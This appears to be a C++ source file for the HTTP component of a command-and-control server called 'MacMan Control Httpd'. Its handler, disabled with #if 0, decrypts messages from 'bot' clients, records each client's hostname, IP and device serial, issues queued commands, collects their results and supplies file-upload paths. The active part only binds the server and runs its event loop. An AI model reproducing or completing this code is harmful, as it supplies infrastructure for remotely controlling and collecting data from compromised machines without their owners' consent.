#include "StdAfx.h"
#include "EventHttpServer.h"
#include "../Public/BinStorage.h"
#include "../Public/Conv.h"
#include "../Public/crypt.h"
#include "../Defines.h"
#include "ProtoManager.h"

#define MYHTTPD_SIGNATURE   "MacMan Control Httpd v1.0"

#if 0
#define GET_REQUEST_VALUE(_x, _key)	_x.find(_key) != _x.end() ? _x.find(_key)->second : _T("")

void HttpdHandler(struct evhttp_request *req, void *arg)
{
	evhttp_add_header(req->output_headers, "Server", MYHTTPD_SIGNATURE);
	evhttp_add_header(req->output_headers, "Content-Type", "text/plain; charset=UTF-8");
	evhttp_add_header(req->output_headers, "Connection", "close");

	struct evbuffer *bufResponse = evbuffer_new();
	evbuffer_add_printf(bufResponse, "It Works");
	evhttp_send_reply(req, HTTP_OK, "OK", bufResponse);
	evbuffer_free(bufResponse);
}

void RecordHandler(struct evhttp_request *req, void *arg)
{
//	CSharedHttpServer *pHttpServer = (CSharedHttpServer *)arg;
	//HTTP header
	evhttp_add_header(req->output_headers, "Server", MYHTTPD_SIGNATURE);
	evhttp_add_header(req->output_headers, "Content-Type", "text/plain; charset=UTF-8");
	evhttp_add_header(req->output_headers, "Connection", "close");
	struct evbuffer *bufResponse = evbuffer_new();
	if (NULL == req->uri || 0 != strcmp(req->uri, "/record"))
	{
		evbuffer_add_printf(bufResponse, "URI NOT FOUND");
		evhttp_send_reply(req, HTTP_NOTFOUND, "NOT FOUND", bufResponse);
		evbuffer_free(bufResponse);
		return;
	}

	std::string strRemoteHost = NULL == req->remote_host ? "" : req->remote_host;
	CString strIp = CA2T(strRemoteHost.c_str()).m_psz;
	USES_CONVERSION;
	DWORD dwIp = inet_addr(strRemoteHost.c_str());

	int iBufSize = (int)EVBUFFER_LENGTH(req->input_buffer);
	if (iBufSize <= 0)
	{
		evbuffer_add_printf(bufResponse, "INTERNAL ERROR(SIZE ZERO)");
		evhttp_send_reply(req, HTTP_INTERNAL, "INTERNAL ERROR(SIZE ZERO)", bufResponse);
		evbuffer_free(bufResponse);
		return;
	}

	LPBYTE post_data = (LPBYTE)EVBUFFER_DATA(req->input_buffer);
	LPBYTE lpData = (LPBYTE)malloc(iBufSize + 2);
	if (NULL == lpData)
	{
		evbuffer_add_printf(bufResponse, "INTERNAL ERROR(MALLOC FAIL)");
		evhttp_send_reply(req, HTTP_INTERNAL, "INTERNAL ERROR(MALLOC FAIL)", bufResponse);
		evbuffer_free(bufResponse);
		return;
	}

	MoveMemory(lpData, post_data, iBufSize);
	BinStorage::Decrypt(COMMUNICATION_KEY, lpData, iBufSize);
	lpData[iBufSize] = 0;
	
	std::map<DWORD, CString> mapRequest;
	BinStorage::STORAGE* pResStorage = (BinStorage::STORAGE*)lpData;
	if ((int)pResStorage->size <= iBufSize && BinStorage::CheckHash(pResStorage))
	{
		DWORD dwItemCount = BinStorage::GetItemCount(pResStorage);
		do 
		{
			BinStorage::ITEM *pItem = NULL;
			int iColIndex = 0;
			int iIndex = 0;
			while((pItem = BinStorage::GetNextItem(pResStorage, pItem)) != NULL)
			{
				DWORD dwId = pItem->id;
				LPTSTR pText = BinStorage::GetItemText(pItem);
				std::map<DWORD, CString>::iterator pIter = mapRequest.find(dwId);
				if (pIter == mapRequest.end())
				{
					mapRequest.insert(std::map<DWORD, CString>::value_type(dwId, pText));
				}
				else
				{
					pIter->second = pText;
				}
				delete[] pText;
			}
		}
		while(FALSE);
		SAFE_DELETE(lpData);
	}
	else
	{
		SAFE_DELETE(lpData);
		evbuffer_add_printf(bufResponse, "INTERNAL ERROR(FORMAT INVALID)");
		evhttp_send_reply(req, HTTP_INTERNAL, "INTERNAL ERROR(FORMAT INVALID)", bufResponse);
		evbuffer_free(bufResponse);
		return;
	}

	std::map<DWORD, CString>::iterator pIter = mapRequest.find(BOT_REQUEST_TYPE);
	if (pIter == mapRequest.end())
	{
		evbuffer_add_printf(bufResponse, "INTERNAL ERROR(TYPE INVALID)");
		evhttp_send_reply(req, HTTP_INTERNAL, "INTERNAL ERROR(TYPE INVALID)", bufResponse);
		evbuffer_free(bufResponse);
		return;
	}
	DWORD dwType = _tstoi(pIter->second);
	if (REQUEST_TYPE_GET_CLIENT_ID == dwType)
	{
		CString strSerial = GET_REQUEST_VALUE(mapRequest, BOT_DEVICE_SERIAL);
		if (!strSerial.IsEmpty())
		{
			strSerial = pIter->second;
			strSerial += _T("__");

			std::string pszSerial = CT2A(pIter->second).m_psz;
			BYTE md5[16] = {0};
			Crypt::_md5Hash(md5, (LPVOID)pszSerial.c_str(), pszSerial.size());
			for (int i = 0; i < _countof(md5); i++)
			{
				CString strTmp;
				strTmp.Format(_T("%02x"), md5[i]);
				strSerial += strTmp;
			}
		}

		DWORD dwSerialLen;
		LPSTR pSerial = CConv::CharToUtf(strSerial, &dwSerialLen);
		BinStorage::STORAGE *pResStorage = new BinStorage::STORAGE;
		DWORD dwHash = BinStorage::ElfHash((LPBYTE)pSerial, strlen(pSerial));
		BinStorage::AddItem(&pResStorage, 0, 0, dwHash);
		delete[] pSerial;

		DWORD dwPostDataSize;
		LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
		if (NULL != pPostData)
		{
			evbuffer_add(bufResponse, pPostData, dwPostDataSize);
			evhttp_send_reply(req, HTTP_OK, "OK", bufResponse);
			evbuffer_free(bufResponse);
			delete[] pPostData;
		}
		else
		{
			evbuffer_add_printf(bufResponse, "COMMUNICATE FAIL");
			evhttp_send_reply(req, HTTP_INTERNAL, "COMMUNICATE FAIL", bufResponse);
			evbuffer_free(bufResponse);
		}
		SAFE_DELETE(pResStorage);
		return;
	}
	else if (REQUEST_TYPE_GET_FILE_UPDOWN_INFO == dwType)
	{
		BinStorage::STORAGE *pResStorage = new BinStorage::STORAGE;
		BinStorage::AddItem(&pResStorage, 0, 0, TRUE);
		std::string strUploadScript = "/safe/upload.php";
		BinStorage::AddItem(&pResStorage, 0, 0, (LPVOID)strUploadScript.c_str(), strUploadScript.size());
		std::string strUploadDir = "/download/";
		BinStorage::AddItem(&pResStorage, 0, 0, (LPVOID)strUploadDir.c_str(), strUploadDir.size());
		
		DWORD dwPostDataSize;
		LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
		if (NULL != pPostData)
		{
			evbuffer_add(bufResponse, pPostData, dwPostDataSize);
			evhttp_send_reply(req, HTTP_OK, "OK", bufResponse);
			evbuffer_free(bufResponse);
			delete[] pPostData;
		}
		else
		{
			evbuffer_add_printf(bufResponse, "COMMUNICATE FAIL");
			evhttp_send_reply(req, HTTP_INTERNAL, "COMMUNICATE FAIL", bufResponse);
			evbuffer_free(bufResponse);
		}
		SAFE_DELETE(pResStorage);
		return;
	}
	else if (REQUEST_TYPE_CLIENT_REQUEST == dwType)
	{
		// Client Id
		CString strClientId = GET_REQUEST_VALUE(mapRequest, BOT_CLIENT_ID);
		DWORD dwClientId = _tstoi(strClientId);
		// Ip In
		CString strIpIn = GET_REQUEST_VALUE(mapRequest, BOT_IP_IN);
		// Hostname
		CString strHostname = GET_REQUEST_VALUE(mapRequest, BOT_HOSTNAME);
		// Device Seiral
		CString strDeviceSeiral = GET_REQUEST_VALUE(mapRequest, BOT_DEVICE_SERIAL);
		// Comment
		CString strComment = GET_REQUEST_VALUE(mapRequest, BOT_COMMENT);
		// Version
		CString strVersion = GET_REQUEST_VALUE(mapRequest, BOT_VERSION);
		DWORD dwVersion = _tstoi(strVersion);
		
		// Update Status
		theProtoManager->HttpdUpdateStatus(dwClientId, strIpIn, strIp, strHostname, strDeviceSeiral, strComment, dwVersion);

		// Get Request
		BOOL bOK = FALSE;
		BinStorage::STORAGE *pResStorage = theProtoManager->HttpdProcessRequest(dwClientId);
		if (NULL != pResStorage)
		{
			DWORD dwPostDataSize;
			LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
			if (NULL != pPostData)
			{
				evbuffer_add(bufResponse, pPostData, dwPostDataSize);
				evhttp_send_reply(req, HTTP_OK, "OK", bufResponse);
				evbuffer_free(bufResponse);
				delete[] pPostData;
				bOK = TRUE;
			}
		}
		
		if (!bOK)
		{
			evbuffer_add_printf(bufResponse, "COMMUNICATE FAIL");
			evhttp_send_reply(req, HTTP_INTERNAL, "COMMUNICATE FAIL", bufResponse);
			evbuffer_free(bufResponse);
		}
		SAFE_DELETE(pResStorage);
		return;
	}
	else if (REQUEST_TYPE_CLIENT_RESULT == dwType)
	{
		CString strEventId = GET_REQUEST_VALUE(mapRequest, BOT_EVENT_ID);
		DWORD dwEventId = _tstoi(strEventId);
		CString strClientId = GET_REQUEST_VALUE(mapRequest, BOT_CLIENT_ID);
		DWORD dwClientId = _tstoi(strClientId);
		CString strResponse = GET_REQUEST_VALUE(mapRequest, BOT_RESPONSE);
		CString strResponseRet = GET_REQUEST_VALUE(mapRequest, BOT_RESPONSE_RET);
		INT iResponseRet = _tstoi(strResponseRet);

		BOOL bOK = FALSE;
		BinStorage::STORAGE *pResStorage = theProtoManager->HttpdProcessResponse(dwEventId, dwClientId, strResponse, iResponseRet);
		if (NULL != pResStorage)
		{
			DWORD dwPostDataSize;
			LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
			if (NULL != pPostData)
			{
				evbuffer_add(bufResponse, pPostData, dwPostDataSize);
				evhttp_send_reply(req, HTTP_OK, "OK", bufResponse);
				evbuffer_free(bufResponse);
				delete[] pPostData;
				bOK = TRUE;
			}
		}

		if (!bOK)
		{
			evbuffer_add_printf(bufResponse, "COMMUNICATE FAIL");
			evhttp_send_reply(req, HTTP_INTERNAL, "COMMUNICATE FAIL", bufResponse);
			evbuffer_free(bufResponse);
		}
		SAFE_DELETE(pResStorage);
		return;
	}
	else if (REQUEST_TYPE_CLIENT_RESULT_ASYNC == dwType)
	{
		CString strClientId = GET_REQUEST_VALUE(mapRequest, BOT_CLIENT_ID);
		DWORD dwClientId = _tstoi(strClientId);
		CString strType = GET_REQUEST_VALUE(mapRequest, BOT_TYPE);
		DWORD dwType = _tstoi(strType);
		CString strResponse = GET_REQUEST_VALUE(mapRequest, BOT_RESPONSE);

		BOOL bOK = FALSE;
		BinStorage::STORAGE *pResStorage = theProtoManager->HttpdProcessResponseAsync(dwClientId, dwType, strResponse);
		if (NULL != pResStorage)
		{
			DWORD dwPostDataSize;
			LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
			if (NULL != pPostData)
			{
				evbuffer_add(bufResponse, pPostData, dwPostDataSize);
				evhttp_send_reply(req, HTTP_OK, "OK", bufResponse);
				evbuffer_free(bufResponse);
				delete[] pPostData;
				bOK = TRUE;
			}
		}

		if (!bOK)
		{
			evbuffer_add_printf(bufResponse, "COMMUNICATE FAIL");
			evhttp_send_reply(req, HTTP_INTERNAL, "COMMUNICATE FAIL", bufResponse);
			evbuffer_free(bufResponse);
		}
		SAFE_DELETE(pResStorage);
		return;
	}

	/*
	std::string strResponse;
	int bufsize = (int)EVBUFFER_LENGTH(req->input_buffer);
	if (bufsize > 0)
	{
		char *post_data = (char *) EVBUFFER_DATA(req->input_buffer);
		char *tmp = (char *)malloc(bufsize + 5); 
		memset(tmp, 0, bufsize + 5); 
		tmp[0] = '/';
		tmp[1] = '?';
		memcpy(tmp + 2, post_data, bufsize);
		//char *decoded_uri = evhttp_decode_uri(tmp);

		struct evkeyvalq params;
		evhttp_parse_query(tmp, &params);

		struct evkeyval *param;
		for (param = params.tqh_first; param; param = param->next.tqe_next)
		{
			std::string key = std::string(param->key);
			std::string value = std::string(param->value);
			if (key == "req")
			{
				strResponse = value;
			}
		}

		evhttp_clear_headers(&params);
		free(tmp);
		//free(decoded_uri);
	}
	if (0 == strResponse.size())
	{
		evbuffer_add_printf(bufResponse, "POST FIELD ERROR");
		evhttp_send_reply(req, HTTP_BADREQUEST, "OK", bufResponse);
		evbuffer_free(bufResponse);
		return;
	}
	*/

//	evbuffer_add_printf(bufResponse, "REMOTE IP ERROR");
//	evhttp_send_reply(req, HTTP_BADREQUEST, "OK", bufResponse);
//	evbuffer_free(bufResponse);

//	evbuffer_add_printf(bufResponse, "%s", strOutput.c_str());
	evbuffer_add_printf(bufResponse, "REMOTE");
	evhttp_send_reply(req, HTTP_OK, "OK", bufResponse);
	evbuffer_free(bufResponse);
}
#endif

DWORD WINAPI _ThreadServerRun(LPVOID lpThreadParameter)
{
	// Process Events
	event_dispatch();

	return 0;
}

CEventHttpServer::CEventHttpServer(void)
{
	mHttpd = NULL;
	mEventBase = NULL;
	m_ServerRunHandle = NULL;
}

CEventHttpServer::~CEventHttpServer(void)
{
}


BOOL CEventHttpServer::Bind(USHORT uPort)
{
	const char *httpd_option_listen = "0.0.0.0";
	int httpd_option_port = uPort;
	int httpd_option_daemon = 0;
	int httpd_option_timeout = 120; //in seconds

	WSADATA wsaData;
	DWORD Ret;
	if ((Ret = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
	{
		OutputLog(_T("WSAStartup failed with error %d\n"), Ret);
		return FALSE;
	}

	// Init event API
	mEventBase = event_init();

	// Create Http server
	mHttpd = evhttp_start(httpd_option_listen, httpd_option_port);
	if (NULL == mHttpd)
	{
		OutputLog(_T("Start Http Server[%d] Failed!\n"), httpd_option_port);
		return FALSE;
	}
	evhttp_set_timeout(mHttpd, httpd_option_timeout);

	// Set Generic Callback
//	evhttp_set_gencb(mHttpd, HttpdHandler, this);
//	evhttp_set_cb(mHttpd, "/record", RecordHandler, this);

	DWORD dwThreadId;
	m_ServerRunHandle = ::CreateThread(NULL, 0, _ThreadServerRun, NULL, 0, &dwThreadId);

	return TRUE;
}

VOID CEventHttpServer::UnBind()
{
	event_loopbreak();
	if (NULL != mHttpd)
	{
		evhttp_free(mHttpd);
		mHttpd = NULL;
	}
	WaitForSingleObject(m_ServerRunHandle, INFINITE);
	if (NULL != mEventBase)
	{
		event_base_free(mEventBase);
		mEventBase = NULL;
	}
}
